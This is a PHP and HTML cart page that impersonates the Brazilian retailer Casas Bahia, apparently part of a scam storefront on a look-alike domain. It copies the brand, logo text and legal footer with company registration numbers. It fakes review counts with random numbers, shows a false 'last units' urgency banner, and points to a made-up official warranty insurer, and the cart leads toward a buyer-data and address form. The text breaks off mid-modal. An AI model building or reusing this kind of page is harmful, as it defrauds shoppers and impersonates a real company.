<?php
require_once __DIR__ . '/config/database.php';
require_once __DIR__ . '/includes/domain_guard.php';
checkDomainAccess();
require_once __DIR__ . '/includes/pixel_tracker.php';

$db = getDBConnection();
$id = $_GET['id'] ?? null;
$isEmptyCart = isset($_GET['empty']) || empty($id);

// Se houver ID de produto, carrega o produto para o carrinho
$product = null;
if (!empty($id)) {
    $stmt = $db->prepare("SELECT * FROM products WHERE id = :id LIMIT 1");
    $stmt->execute(['id' => $id]);
    $product = $stmt->fetch();
}

// Buscar produtos sugeridos ("Indicados com base nas suas visitas")
$suggestedProducts = [];
if ($db) {
    $driver = strtolower($db->getAttribute(PDO::ATTR_DRIVER_NAME) ?? '');
    $randSql = ($driver === 'sqlite' || $driver === 'pgsql') ? 'RANDOM()' : 'RAND()';
    if ($product) {
        $stmtSugg = $db->prepare("SELECT * FROM products WHERE id != :id ORDER BY {$randSql} LIMIT 4");
        $stmtSugg->execute(['id' => $product['id']]);
    } else {
        $stmtSugg = $db->query("SELECT * FROM products ORDER BY {$randSql} LIMIT 4");
    }
    $suggestedProducts = $stmtSugg->fetchAll();
}

// Caso o carrinho esteja vazio
if ($isEmptyCart || !$product) {
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Meu carrinho | Casas Bahia</title>
  <link rel="icon" href="https://www.casasbahia.com.br/favicon.ico">
  <?php renderFacebookPixel('PageView'); ?>
  <style>
    :root {
      --cb-blue: #003399;
      --cb-red: #e30613;
      --cb-bg: #f8f9fa;
      --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: var(--font-family); background-color: var(--cb-bg); color: #1e293b; line-height: 1.4; -webkit-font-smoothing: antialiased; }
    
    .top-red-line { height: 4px; background-color: var(--cb-red); width: 100%; }

    header { background: #000000; padding: 14px 16px; border-bottom: 1px solid #111111; display: flex; align-items: center; justify-content: space-between; }
    .brand-logo { font-size: 20px; font-weight: 900; color: #ffffff; text-decoration: none; letter-spacing: -0.5px; }
    .brand-logo span { color: #ffffff; }
    .accessibility-icon { color: #ffffff; display: flex; align-items: center; }
    .accessibility-icon svg { stroke: #ffffff !important; }
    .accessibility-icon svg circle:nth-child(2) { fill: #ffffff !important; }

    .empty-cart-container { max-width: 520px; margin: 0 auto; padding: 20px 16px; }
    .cart-title-main { font-size: 22px; font-weight: 700; color: #0f172a; margin-bottom: 20px; }

    .empty-cart-card { background-color: #ffffff; border-radius: 16px; padding: 40px 20px; text-align: center; margin-bottom: 30px; border: 1px solid #e2e8f0; }
    .empty-cart-icon-box { margin-bottom: 20px; display: flex; align-items: center; justify-content: center; }
    .empty-cart-subtitle { font-size: 20px; font-weight: 800; color: var(--cb-blue); margin-bottom: 10px; }
    .empty-cart-text { font-size: 14px; color: #64748b; margin: 0 auto 24px auto; max-width: 320px; }
    
    .btn-go-home { display: inline-block; background-color: #ffffff; border: 2px solid var(--cb-blue); color: var(--cb-blue); font-size: 15px; font-weight: 700; padding: 12px 30px; border-radius: 8px; text-decoration: none; }

    .empty-cart-legal-footer { border-top: 1px solid #e2e8f0; padding-top: 20px; margin-top: 30px; font-size: 12px; color: #64748b; line-height: 1.6; }
  </style>
</head>
<body>
  <div class="top-red-line"></div>

  <header>
    <a href="home.php" class="brand-logo">CASAS<span>BAHIA</span></a>
    <div class="accessibility-icon">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#003399" stroke-width="1.8">
        <circle cx="12" cy="12" r="10"/>
        <circle cx="12" cy="6.5" r="1.5" fill="#003399" stroke="none"/>
        <path d="M7 10.5h10M12 10.5v5M9.5 19.5l2.5-4 2.5 4" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
  </header>

  <div class="empty-cart-container">
    <h1 class="cart-title-main">Meu carrinho</h1>

    <div class="empty-cart-card">
      <div class="empty-cart-icon-box">
        <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#003399" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="9" cy="21" r="1"/>
          <circle cx="20" cy="21" r="1"/>
          <path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/>
          <line x1="3" y1="3" x2="21" y2="21" stroke="#003399" stroke-width="2.5"/>
        </svg>
      </div>
      <h2 class="empty-cart-subtitle">Seu carrinho está vazio</h2>
      <p class="empty-cart-text">Confira nossas recomendações abaixo ou volte à tela inicial para explorar outros produtos</p>
      <a href="home.php" class="btn-go-home">Ir para o início</a>
    </div>

    <div class="empty-cart-legal-footer">
      Grupo Casas Bahia S.A. | www.casasbahia.com.br | Rua Florida, 1970 | São Paulo - SP | CEP: 04565-001 | CNPJ: 33.041.260/0652-90 | Inscrição Estadual: 133.091.229.115
    </div>
  </div>
</body>
</html>
<?php
exit;
}

// Imagem Principal do Produto
$stmtImg = $db->prepare("SELECT image_url FROM product_images WHERE product_id = :pid ORDER BY is_main DESC, id ASC LIMIT 1");
$stmtImg->execute(['pid' => $product['id']]);
$mainImage = $stmtImg->fetchColumn();
if (!$mainImage) {
    $mainImage = 'assets/images/product_aoc_main.png';
}

$monthlyWarranty = round(($product['pix_price'] * 0.15) / 10, 2);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Meu carrinho | Casas Bahia</title>
  <link rel="icon" href="https://www.casasbahia.com.br/favicon.ico">
  <!-- OPEN GRAPH / SOCIAL SHARE (WHATSAPP, FACEBOOK, TELEGRAM, TWITTER) -->
  <?php
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    $siteHost = $_SERVER['HTTP_HOST'] ?? 'meucarrinho.online';
    $baseUrl = $protocol . $siteHost;

    $ogCartTitle = $product['title'] . " | Casas Bahia";
    $ogCartPrice = "R$ " . number_format($product['pix_price'], 2, ',', '.');
    $ogCartDesc = "Garanta " . $product['title'] . " por apenas " . $ogCartPrice . " no Pix com frete grátis nas Casas Bahia!";

    $ogCartImage = $baseUrl . '/assets/images/casasbahia_home_share.jpg';
    if (!empty($mainImage)) {
        if (strpos($mainImage, 'http://') === 0 || strpos($mainImage, 'https://') === 0) {
            $ogCartImage = $mainImage;
        } else {
            $ogCartImage = $baseUrl . '/' . ltrim($mainImage, '/');
        }
    }
    $ogCartUrl = $baseUrl . '/carrinho.php?id=' . $product['id'];
  ?>
  <meta property="og:type" content="product">
  <meta property="og:site_name" content="Casas Bahia">
  <meta property="og:title" content="<?= htmlspecialchars($ogCartTitle) ?>">
  <meta property="og:description" content="<?= htmlspecialchars($ogCartDesc) ?>">
  <meta property="og:image" content="<?= htmlspecialchars($ogCartImage) ?>">
  <meta property="og:image:secure_url" content="<?= htmlspecialchars($ogCartImage) ?>">
  <meta property="og:url" content="<?= htmlspecialchars($ogCartUrl) ?>">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="<?= htmlspecialchars($ogCartTitle) ?>">
  <meta name="twitter:description" content="<?= htmlspecialchars($ogCartDesc) ?>">
  <meta name="twitter:image" content="<?= htmlspecialchars($ogCartImage) ?>">
  <?php renderFacebookPixel('AddToCart', ['content_name' => $product['title'], 'content_ids' => [strval($product['id'])], 'content_type' => 'product', 'value' => (float)$product['pix_price'], 'currency' => 'BRL']); ?>
  <style>
    :root {
      --cb-blue: #003399;
      --cb-red: #e30613;
      --cb-green: #168019;
      --cb-bg: #f8f9fa;
      --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font-family); }
    body { background-color: var(--cb-bg); color: #0f172a; padding-bottom: 120px; -webkit-font-smoothing: antialiased; }

    /* LINHA VERMELHA TOPO */
    .top-red-line { height: 4px; background-color: var(--cb-red); width: 100%; }

    /* HEADER */
    header { background: #000000; padding: 14px 16px; border-bottom: 1px solid #111111; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100; }
    .brand-logo { font-size: 20px; font-weight: 900; color: #ffffff; text-decoration: none; letter-spacing: -0.5px; }
    .brand-logo span { color: #ffffff; }
    .accessibility-icon { color: #ffffff; display: flex; align-items: center; cursor: pointer; }
    .accessibility-icon svg { stroke: #ffffff !important; }
    .accessibility-icon svg circle:nth-child(2) { fill: #ffffff !important; }

    /* CONTAINER PRINCIPAL DO CARRINHO */
    .cart-container { max-width: 480px; margin: 0 auto; padding: 16px; }
    .cart-title-main { font-size: 22px; font-weight: 700; color: #0f172a; margin: 12px 0 16px 0; }

    /* 1. CARD FRETE IDÊNTICO À FOTO (MEDIA_1787969199442.JPG) */
    .card-box { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 12px; margin-bottom: 16px; overflow: hidden; }
    
    .freight-top-row { display: flex; align-items: center; justify-content: space-between; padding: 14px 16px; }
    .freight-title-left { display: flex; align-items: center; gap: 8px; font-size: 15px; font-weight: 700; color: #0f172a; }
    .discover-cep-link { font-size: 14px; font-weight: 700; color: var(--cb-blue); text-decoration: none; display: flex; align-items: center; gap: 4px; cursor: pointer; }
    
    .card-divider { height: 1px; background: #e2e8f0; width: 100%; }

    .freight-body { padding: 16px; }
    .freight-subtext { font-size: 14px; color: #475569; line-height: 1.45; margin-bottom: 16px; }

    .cep-input-field { width: 100%; height: 48px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 0 14px; font-size: 15px; outline: none; transition: border-color 0.2s; color: #0f172a; }
    .cep-input-field:focus { border-color: var(--cb-blue); }

    .btn-calculate-cep { width: 100%; height: 48px; background: var(--cb-blue); color: #ffffff; border: none; border-radius: 8px; font-size: 15px; font-weight: 700; margin-top: 12px; cursor: pointer; }
    .btn-calculate-cep:active { opacity: 0.9; }

    /* BANNER LARANJA ÚLTIMAS UNIDADES (FOTO MEDIA_1787969199442.JPG) */
    .urgency-orange-banner { background: #f97316; border-radius: 12px; padding: 14px 16px; margin-bottom: 16px; color: #ffffff; position: relative; }

    /* 2. CARD DO PRODUTO IDÊNTICO AO DA FOTO 1 E 2 */
    .product-seller-row { padding: 14px 16px; font-size: 13px; color: #64748b; }
    .product-seller-row strong { color: var(--cb-blue); font-weight: 700; }

    .product-item-content { padding: 16px; }
    .product-main-flex { display: flex; align-items: flex-start; gap: 12px; position: relative; }

    .custom-checkbox { width: 20px; height: 20px; accent-color: var(--cb-blue); cursor: pointer; flex-shrink: 0; margin-top: 4px; }

    .product-thumb { width: 76px; height: 76px; object-fit: contain; flex-shrink: 0; border-radius: 6px; }

    .product-info-col { flex: 1; min-width: 0; padding-right: 20px; }
    .product-title-text { font-size: 14px; font-weight: 500; color: #1e293b; line-height: 1.35; margin-bottom: 4px; word-break: break-word; }
    .product-variant-text { font-size: 13px; color: #64748b; margin-bottom: 12px; }

    .btn-remove-item { position: absolute; top: 0; right: 0; background: none; border: none; font-size: 18px; color: #64748b; cursor: pointer; padding: 2px 4px; line-height: 1; }

    .product-price-qty-row { display: flex; align-items: flex-end; justify-content: space-between; margin-top: 8px; }
    .product-price-val { font-size: 18px; font-weight: 800; color: #0f172a; line-height: 1.1; }
    .product-price-sub { font-size: 12px; color: #64748b; font-weight: 400; margin-top: 2px; }

    .qty-dropdown-select { border: 1px solid #cbd5e1; border-radius: 8px; padding: 6px 10px; font-size: 13px; font-weight: 600; color: #0f172a; background: #ffffff; cursor: pointer; outline: none; }

    /* CARD DE GARANTIA ESTENDIDA DENTRO DO CARD DE PRODUTO */
    .warranty-box-inside { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 12px; margin-top: 16px; display: flex; align-items: flex-start; gap: 10px; }
    .warranty-checkbox { width: 18px; height: 18px; accent-color: var(--cb-blue); margin-top: 2px; flex-shrink: 0; cursor: pointer; }
    .warranty-shield-icon { color: var(--cb-blue); flex-shrink: 0; margin-top: 2px; }
    .warranty-text-col { font-size: 13px; color: #1e293b; flex: 1; }
    .warranty-title-bold { font-weight: 700; margin-bottom: 2px; }
    .warranty-price-sub { font-size: 12px; color: #64748b; }
    .warranty-terms-link { font-size: 12px; color: var(--cb-blue); text-decoration: none; font-weight: 600; }

    /* SEÇÃO POSSUI CUPOM OU VALE + BOTÃO COMPRAR MAIS PRODUTOS */
    .coupon-section { text-align: center; margin: 28px 0; }
    .coupon-title { font-size: 16px; font-weight: 700; color: #0f172a; margin-bottom: 4px; }
    .coupon-sub { font-size: 14px; color: #475569; margin-bottom: 20px; }
    
    .btn-buy-more { display: flex; align-items: center; justify-content: center; width: 100%; height: 48px; background: #ffffff; border: 2px solid var(--cb-blue); color: var(--cb-blue); border-radius: 8px; font-size: 15px; font-weight: 700; text-decoration: none; transition: background 0.2s; }
    .btn-buy-more:hover { background: #f0f5ff; }

    /* SEÇÃO INFORMAÇÕES SOBRE PREÇO E ESTOQUE */
    .info-stock-section { margin-bottom: 28px; }
    .info-stock-title { font-size: 15px; font-weight: 700; color: #0f172a; margin-bottom: 10px; }
    .info-stock-list { list-style: none; padding-left: 0; font-size: 14px; color: #334155; line-height: 1.5; }
    .info-stock-list li { position: relative; padding-left: 16px; margin-bottom: 8px; }
    .info-stock-list li::before { content: "•"; position: absolute; left: 0; top: 0; color: #64748b; font-size: 16px; line-height: 1; }

    /* SEÇÃO INDICADOS COM BASE NAS SUAS VISITAS */
    .suggested-section { margin-top: 32px; padding-top: 24px; border-top: 1px solid #e2e8f0; }
    .suggested-title { font-size: 18px; font-weight: 800; color: var(--cb-blue); margin-bottom: 16px; }
    
    .suggested-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .suggested-card { background: #ffffff; border: 1px solid #e2e8f0; border-radius: 12px; padding: 12px; position: relative; text-decoration: none; color: inherit; display: flex; flex-direction: column; }
    .suggested-badge-2h { position: absolute; top: 10px; left: 10px; background: #e30613; color: #ffffff; font-size: 14px; font-weight: 900; padding: 2px 6px; border-radius: 4px; line-height: 1; z-index: 2; }
    .suggested-img-box { width: 100%; height: 130px; display: flex; align-items: center; justify-content: center; margin-bottom: 10px; }
    .suggested-img-box img { max-width: 100%; max-height: 100%; object-fit: contain; }
    .suggested-card-title { font-size: 12px; color: #334155; line-height: 1.35; height: 32px; overflow: hidden; margin-bottom: 6px; font-weight: 500; }
    .suggested-stars { font-size: 11px; color: #d97706; font-weight: 700; margin-bottom: 6px; display: flex; align-items: center; gap: 3px; }
    .suggested-price { font-size: 15px; font-weight: 800; color: var(--cb-blue); margin-top: auto; }

    /* RODAPÉ LEGAL CNPJ CASAS BAHIA (FOTO 4) */
    .legal-footer-text { margin-top: 36px; padding-top: 20px; border-top: 1px solid #e2e8f0; font-size: 12px; color: #64748b; line-height: 1.65; font-weight: 400; }

    /* BARRA FIXA INFERIOR DE CONTINUAR A COMPRA (FOTO 1 E 2) */
    .sticky-footer-checkout { position: fixed; bottom: 0; left: 0; right: 0; background: #ffffff; border-top: 1px solid #e2e8f0; padding: 12px 16px; z-index: 999; box-shadow: 0 -4px 16px rgba(0,0,0,0.08); }
    .sticky-footer-inner { max-width: 480px; margin: 0 auto; }
    
    .summary-toggle-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; }
    .toggle-summary-btn { background: none; border: none; font-size: 14px; font-weight: 700; color: #0f172a; cursor: pointer; display: flex; align-items: center; gap: 6px; padding: 0; }
    .summary-price-col { text-align: right; }
    .summary-price-total { font-size: 20px; font-weight: 800; color: #0f172a; line-height: 1; }
    .summary-price-sub { font-size: 12px; color: #64748b; font-weight: 400; margin-top: 2px; }

    .btn-continue-green { display: flex; align-items: center; justify-content: center; width: 100%; height: 48px; background: var(--cb-green); color: #ffffff; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; text-decoration: none; cursor: pointer; box-shadow: 0 2px 6px rgba(22, 128, 25, 0.2); }
    .btn-continue-green:active { background: #136915; }

    /* MODAL POPUP COMPLETO DE DADOS DO COMPRADOR E ENDEREÇO */
    .full-address-modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.6); z-index: 3000; display: none; align-items: center; justify-content: center; padding: 16px; }
    .full-address-modal-card { background: #ffffff; border-radius: 14px; width: 100%; max-width: 500px; max-height: 90vh; overflow-y: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
    
    .modal-blue-header { background: var(--cb-blue); color: #ffffff; padding: 16px 20px; border-top-left-radius: 14px; border-top-right-radius: 14px; display: flex; align-items: center; justify-content: space-between; font-size: 18px; font-weight: 800; }
    .modal-close-x { background: none; border: none; color: #ffffff; font-size: 24px; cursor: pointer; line-height: 1; }

    .modal-body-padding { padding: 20px; }

    .form-field-group { margin-bottom: 16px; }
    .field-label { display: block; font-size: 13px; font-weight: 700; color: #333333; margin-bottom: 6px; }
    .field-input { width: 100%; height: 44px; padding: 0 12px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 14px; outline: none; background: #ffffff; color: #333333; }
    .field-input:focus { border-color: var(--cb-blue); }
    .field-subtext { font-size: 11px; color: #777777; margin-top: 4px; display: block; }

    .readonly-field { background-color: #f4f6f8; color: #666666; cursor: not-allowed; }

    .grid-2-col { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
    .grid-number-row { display: flex; gap: 12px; align-items: flex-start; }
    .checkbox-row-item { display: flex; align-items: center; gap: 6px; font-size: 13px; color: #333333; margin-top: 28px; white-space: nowrap; }

    .btn-use-location { width: 100%; height: 42px; background: #ffffff; border: 1.5px solid var(--cb-blue); color: var(--cb-blue); border-radius: 6px; font-weight: 700; font-size: 14px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 16px; }
    
    .btn-save-address-blue { width: 100%; height: 48px; background-color: var(--cb-blue); color: #ffffff; border: none; border-radius: 6px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
  </style>
</head>
<body>

  <!-- TOPO LINHA VERMELHA -->
  <div class="top-red-line"></div>

  <!-- HEADER -->
  <header>
    <a href="index.php?id=<?= $product['id'] ?>" class="brand-logo">CASAS<span>BAHIA</span></a>
    <div class="accessibility-icon" title="Acessibilidade">
      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#003399" stroke-width="1.8">
        <circle cx="12" cy="12" r="10"/>
        <circle cx="12" cy="6.5" r="1.5" fill="#003399" stroke="none"/>
        <path d="M7 10.5h10M12 10.5v5M9.5 19.5l2.5-4 2.5 4" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
  </header>

  <div class="cart-container">
    
    <h1 class="cart-title-main">Meu carrinho</h1>

    <!-- CARD 1: CALCULAR FRETE (FOTO 1 E MEDIA_1787969199442.JPG) -->
    <div class="card-box" id="freightCardMain">
      
      <!-- ESTADO INICIAL SEM CEP -->
      <div id="initialFreightContainer">
        <div class="freight-top-row">
          <div class="freight-title-left">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0f172a" stroke-width="2.2">
              <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/>
            </svg>
            <span>Calcular frete</span>
          </div>
          <a href="https://buscacepinter.correios.com.br/app/endereco/index.php" target="_blank" rel="noopener" class="discover-cep-link">
            Descobrir CEP 
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="3"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/></svg>
          </a>
        </div>

        <div class="card-divider"></div>

        <div class="freight-body">
          <p class="freight-subtext">Adicione um CEP para calcular entrega, valor final e continuar sua compra</p>
          <form id="cartCepForm" onsubmit="handleCartCepSubmit(event)">
            <input type="text" id="cartCepInput" class="cep-input-field" placeholder="CEP de entrega" maxlength="9" required>
            <button type="submit" class="btn-calculate-cep">Calcular</button>
          </form>
        </div>
      </div>

      <!-- ESTADO APÓS DIGITAR O CEP (IDÊNTICO À FOTO MEDIA_1787969199442.JPG) -->
      <div id="searchedFreightContainer" style="display: none;">
        <div class="freight-top-row">
          <div class="freight-title-left">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0f172a" stroke-width="2.2">
              <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/>
            </svg>
            <span id="displayCepTitle">Frete para 88495-000</span>
          </div>
          <a href="#" class="discover-cep-link" onclick="resetCartCep(event)">
            Alterar 
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
          </a>
        </div>

        <div class="card-divider"></div>

        <div class="freight-body" style="display: flex; align-items: center; justify-content: space-between; padding: 16px;">
          <div style="font-size: 14px; color: #1e293b; line-height: 1.45;" id="displayDeliveryDate">
            Receba tudo até 22 de setembro, terça.
          </div>
          <div style="font-size: 16px; font-weight: 800; color: #168019; text-align: right;">
            Grátis
          </div>
        </div>
      </div>

    </div>

    <!-- BANNER LARANJA ÚLTIMAS UNIDADES (FOTO MEDIA_1787969199442.JPG) -->
    <div class="urgency-orange-banner" id="urgencyOrangeBanner">
      <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 4px;">
        <div style="font-size: 15px; font-weight: 800; display: flex; align-items: center; gap: 6px;">
          🔥 Últimas unidades
        </div>
        <button type="button" onclick="document.getElementById('urgencyOrangeBanner').style.display='none'" style="background: none; border: none; color: #ffffff; font-size: 18px; cursor: pointer; line-height: 1; padding: 0 2px;">✕</button>
      </div>
      <div style="font-size: 13px; color: #ffffff; line-height: 1.45; opacity: 0.95;">
        Todo mundo está comprando os mesmos itens que você. Finalize seu pedido e garanta essas ofertas.
      </div>
    </div>

    <!-- CARD 2: PRODUTO NO CARRINHO (FOTO 1 E 2) -->
    <div class="card-box" id="productCardMain">
      <div class="product-seller-row">
        Vendido por <strong>Casas Bahia</strong>
      </div>

      <div class="card-divider"></div>

      <div class="product-item-content">
        <div class="product-main-flex">
          <input type="checkbox" class="custom-checkbox" id="productSelectCheck" checked onchange="toggleProductSelection(this)">
          
          <img src="<?= htmlspecialchars($mainImage) ?>" alt="<?= htmlspecialchars($product['title']) ?>" class="product-thumb">

          <div class="product-info-col">
            <h2 class="product-title-text"><?= htmlspecialchars($product['title']) ?></h2>
            <div class="product-variant-text" id="cartVariationBadge">
              <?= !empty($product['variation_default']) ? htmlspecialchars($product['variation_default']) : '' ?>
            </div>

            <div class="product-price-qty-row">
              <div>
                <div class="product-price-val" id="productDisplayPrice">R$ <?= number_format($product['pix_price'], 2, ',', '.') ?></div>
                <div class="product-price-sub">no Pix ou cartão</div>
              </div>

              <!-- SELETOR DE QUANTIDADE -->
              <select class="qty-dropdown-select" id="cartQtySelect" onchange="updateCartQuantity(this.value)">
                <option value="1" selected>01 un</option>
                <option value="2">02 un</option>
                <option value="3">03 un</option>
                <option value="4">04 un</option>
                <option value="5">05 un</option>
              </select>
            </div>
          </div>

          <button type="button" class="btn-remove-item" onclick="removeProductFromCart()" title="Remover do carrinho">✕</button>
        </div>

        <!-- OPCIONAL: GARANTIA ESTENDIDA (SE DISPONÍVEL NA CONTA) -->
        <div class="warranty-box-inside" id="cartWarrantyBox">
          <input type="checkbox" class="warranty-checkbox" id="warrantyCheckCart" onchange="toggleWarrantyCart(this)">
          <div class="warranty-shield-icon">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#003399" stroke-width="2">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
          </div>
          <div class="warranty-text-col">
            <div class="warranty-title-bold">Garantia Estendida</div>
            <div class="warranty-price-sub">a partir de 10x de R$ <?= number_format($monthlyWarranty, 2, ',', '.') ?></div>
            <a href="#" class="warranty-terms-link" onclick="alert('Garantia fornecida pela seguradora oficial Casas Bahia.'); return false;">Termos e Condições do seguro</a>
          </div>
        </div>

      </div>
    </div>

    <!-- SEÇÃO POSSUI CUPOM OU VALE? (FOTO 2) -->
    <div class="coupon-section">
      <h3 class="coupon-title">Possui cupom ou vale?</h3>
      <p class="coupon-sub">Você vai poder usar na etapa de pagamento.</p>
      
      <a href="home.php" class="btn-buy-more">Comprar mais produtos</a>
    </div>

    <!-- SEÇÃO INFORMAÇÕES SOBRE PREÇO E ESTOQUE (FOTO 2 E 3) -->
    <div class="info-stock-section">
      <h3 class="info-stock-title">Informações sobre preço e estoque</h3>
      <ul class="info-stock-list">
        <li>Produtos no carrinho não são reservados. Realize o pagamento e garanta sua compra.</li>
        <li>Itens promocionais possuem estoque limitado.</li>
        <li>Valores podem ser alterados conforme opção de pagamento escolhida.</li>
      </ul>
    </div>

    <!-- SEÇÃO INDICADOS COM BASE NAS SUAS VISITAS (FOTO 3) -->
    <?php if (!empty($suggestedProducts)): ?>
    <div class="suggested-section">
      <h2 class="suggested-title">Indicados com base nas suas visitas</h2>
      
      <div class="suggested-grid">
        <?php foreach ($suggestedProducts as $sugg): ?>
          <?php
            $stmtSImg = $db->prepare("SELECT image_url FROM product_images WHERE product_id = :pid ORDER BY is_main DESC, id ASC LIMIT 1");
            $stmtSImg->execute(['pid' => $sugg['id']]);
            $suggImg = $stmtSImg->fetchColumn() ?: 'assets/images/product_aoc_main.png';
          ?>
          <a href="index.php?id=<?= $sugg['id'] ?>" class="suggested-card">
            <div class="suggested-badge-2h">2H</div>
            <div class="suggested-img-box">
              <img src="<?= htmlspecialchars($suggImg) ?>" alt="<?= htmlspecialchars($sugg['title']) ?>">
            </div>
            <div class="suggested-card-title"><?= htmlspecialchars($sugg['title']) ?></div>
            <div class="suggested-stars">
              ★★★★★ <span style="color: #64748b; font-size: 11px;">(<?= rand(100, 2900) ?>)</span>
            </div>
            <div class="suggested-price">R$ <?= number_format($sugg['pix_price'], 2, ',', '.') ?></div>
          </a>
        <?php endforeach; ?>
      </div>
    </div>
    <?php endif; ?>

    <!-- RODAPÉ LEGAL CNPJ CASAS BAHIA (FOTO 4) -->
    <div class="legal-footer-text">
      Grupo Casas Bahia S.A. | www.casasbahia.com.br | Rua Florida, 1970 | São Paulo - SP | CEP: 04565-001 | CNPJ: 33.041.260/0652-90 | Inscrição Estadual: 133.091.229.115
    </div>

  </div>

  <!-- BARRA FIXA INFERIOR DE CONTINUAR A COMPRA (FOTO 1 E 2) -->
  <div class="sticky-footer-checkout">
    <div class="sticky-footer-inner">
      
      <div class="summary-toggle-row">
        <button type="button" class="toggle-summary-btn" onclick="openOrderSummaryModal(event)">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="18 15 12 9 6 15"/></svg>
          Exibir resumo
        </button>
        <div class="summary-price-col">
          <div class="summary-price-total" id="footerTotalPrice">R$ <?= number_format($product['pix_price'], 2, ',', '.') ?></div>
          <div class="summary-price-sub">No Pix ou Cartão</div>
        </div>
      </div>

      <button type="button" onclick="handleContinueClick(event)" class="btn-continue-green" id="btnContinueCheckout">
        Continuar a compra
      </button>
    </div>
  </div>

  <!-- MODAL POPUP PEQUENO DE RESUMO DO PEDIDO -->
  <div class="full-address-modal-overlay" id="orderSummaryModalOverlay" onclick="closeOrderSummaryModal(event)">
    <div class="full-address-modal-card" style="max-width: 440px;" onclick="event.stopPropagation()">
      <div class="modal-blue-header" style="padding: 14px 18px; font-size: 16px;">
        <span>Resumo do pedido</span>
        <button type="button" class="modal-close-x" onclick="closeOrderSummaryModal(event)">✕</button>
      </div>

      <div class="modal-body-padding" style="padding: 18px;">
        <!-- ITEM DO PRODUTO (FOTO + TÍTULO + PREÇO) -->
        <div style="display: flex; gap: 12px; align-items: center; margin-bottom: 16px; padding-bottom: 14px; border-bottom: 1px solid #e2e8f0;">
          <img src="<?= htmlspecialchars($mainImage) ?>" alt="<?= htmlspecialchars($product['title']) ?>" style="width: 68px; height: 68px; object-fit: contain; border-radius: 8px; border: 1px solid #e2e8f0; padding: 4px; background: #ffffff;">
          <div style="flex: 1;">
            <div style="font-size: 13px; font-weight: 700; color: #0f172a; line-height: 1.35; margin-bottom: 6px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;">
              <?= htmlspecialchars($product['title']) ?>
            </div>
            <div style="font-size: 12px; color: #64748b;">
              Qtd: <strong id="summaryModalProductQty" style="color: #0f172a;">01 un</strong> | <strong id="summaryModalProductPrice" style="color: #0f172a;">R$ <?= number_format($product['pix_price'], 2, ',', '.') ?></strong>
            </div>
          </div>
        </div>

        <!-- DETALHAMENTO DE VALORES -->
        <div style="font-size: 14px; color: #334155; line-height: 2;">
          <div style="display: flex; justify-content: space-between;">
            <span>Subtotal (produtos):</span>
            <strong id="summaryModalSubtotal">R$ <?= number_format($product['pix_price'], 2, ',', '.') ?></strong>
          </div>
          <div style="display: flex; justify-content: space-between;">
            <span>Frete:</span>
            <strong style="color: #168019; font-weight: 800;">Grátis</strong>
          </div>
          <div id="summaryModalWarrantyRow" style="display: none; justify-content: space-between; color: #003399;">
            <span>Garantia Estendida:</span>
            <strong id="summaryModalWarrantyVal">R$ 0,00</strong>
          </div>
        </div>

        <div style="margin-top: 14px; padding-top: 12px; border-top: 2px solid #e2e8f0; display: flex; justify-content: space-between; align-items: center;">
